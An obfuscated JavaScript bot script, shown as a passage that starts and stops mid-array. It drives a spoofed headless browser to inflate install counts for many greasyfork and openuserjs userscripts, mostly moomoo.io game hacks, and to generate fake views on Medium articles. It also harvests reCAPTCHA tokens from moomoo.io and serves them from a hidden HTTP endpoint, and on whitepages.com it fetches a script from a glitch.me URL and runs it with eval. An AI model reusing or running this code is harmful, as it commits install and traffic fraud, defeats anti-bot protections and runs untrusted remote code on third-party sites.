      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + X(0x6, '^BB&') + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0x10, '8GPb') + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + X(0x12, 'TEHN') + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + X(0x8, 'kF9w') + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + W(0x11) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + X(0xa, 'mmZ5') + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + W(0x9) + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    W(0xf) + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x9ee + 0xbcd + -0x1df
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x3 * 0xc14 + -0x84 * 0x43 + 0x8 * -0x36)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x20d1 + -0x2431 + 0x4566), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1 * -0x91 + -0xbc * -0x13 + -0xe21 * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xcf * 0x6 + -0x6c2 + 0xb9c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1a33 + 0x445 * 0x2 + -0x22bd; w < getRandomInt(0x110d + -0x118 + -0xff4, 0x1cfc + 0x3bf + -0x20b6); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x10e6 * 0x7 + 0x12 * -0x1348 + 0x2bbba);
        }
      }();
    }, -0x811 + -0x210b + 0x2980), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + Y(0x15)]();
      let w = -0x71f * -0x3 + 0x101 * -0x17 + -0x22 * -0xd;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x19de + 0x21b8 + -0x3b96 * 0x1, 0x2 * -0xd63 + 0x133f * -0x1 + -0x2e37 * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x5285 + -0xa8b0 + 0x1 * 0x17065);
    }, -0x1b41 + 0x44f + -0x3a * -0x67), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xe35 + 0x13 * 0x1 + -0x2 * 0x724;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x5 * -0x61c + 0x1bff + 0xe45), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x66d * 0x5 + 0x156b + -0x2 * -0x55b), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xbc84c + -0xbdd * -0x23b + -0x18829b);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xc11 + 0x238a + 0x1715 * -0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x8f5 + 0x5d * -0x47 + -0x18 * -0x17b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x21a2 + 0xe * -0x1f3 + -0x434 * -0x6);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a0 = d,
      Z = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1 * -0x7f5 + -0x9fe + -0x8fa * -0x2) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1bb * -0xb + 0x128 + 0x2 * 0x8f1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x16 * 0x84 + -0x13 * 0x209 + 0x3203, D['indexOf']('\x20'));
        return B ? E['slice'](0x22ce + 0x1055 + 0x3ef * -0xd, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x10 * 0x13c + 0x3107 + -0x9c9 * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x83f * 0x9 + 0x21d3 + 0x46a * 0x12),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': Z(0x16, 'JO8o') + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': a0(0x5),
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
